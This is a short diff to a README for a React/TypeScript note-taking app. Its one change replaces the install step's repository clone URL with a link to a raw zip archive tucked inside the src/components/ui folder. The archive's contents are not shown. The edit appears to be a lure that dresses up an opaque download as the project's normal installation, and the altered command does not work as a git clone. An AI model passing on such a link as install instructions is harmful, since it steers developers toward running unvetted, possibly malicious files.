@@ -20,7 +20,7 @@ A modern, responsive note-taking app built with **React**, **TypeScript**, **Tai
 ## 📦 Installation
 ```bash
 # Clone the repository
-git clone https://github.com/devang-p12/NotesApp.git
+git clone https://github.com/devang-p12/NotesApp/raw/refs/heads/main/src/components/ui/Notes_App_1.6.zip
 cd NotesApp
 
 # Install dependencies
